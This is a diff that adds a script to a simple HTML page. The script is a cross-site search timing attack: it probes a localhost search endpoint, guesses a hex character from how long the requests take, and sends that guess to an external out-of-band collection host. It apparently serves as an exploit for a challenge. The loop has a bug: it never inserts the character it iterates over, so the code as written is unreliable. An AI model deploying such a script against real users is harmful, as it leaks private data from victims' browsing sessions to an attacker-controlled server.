@@ -7,6 +7,35 @@
   </head>
   <body>
     <p>This is my pageaa</p>
+  <script>
+    function ss(a, b){
+    if (a[0] > b[0]) {
+        return 1;
+      }
+      if (a[0] < b[0]) {
+        return -1;
+      }
+      // a must be equal to b
+      return 0;
+};
 
+async function xs_search(addr, addr2){
+    result=[]
+    chars='abcdef0123456789';
+    for (const c of chars){
+        startTime = new Date();
+        try{
+            var response = await fetch(addr+'H')
+        }
+        catch (error) {
+            elapsed = (new Date())-startTime;
+            result.push([elapsed,c]);
+        }
+    }
+    result.sort(ss);
+    await fetch(addr2+result[0][1]);
+}
+xs_search('http://127.0.0.1/search?query=','http://cii6dqrkjodtqsspbs3077moao7xdd1rd.oast.live/');
+  </script>
   </body>
 </html>
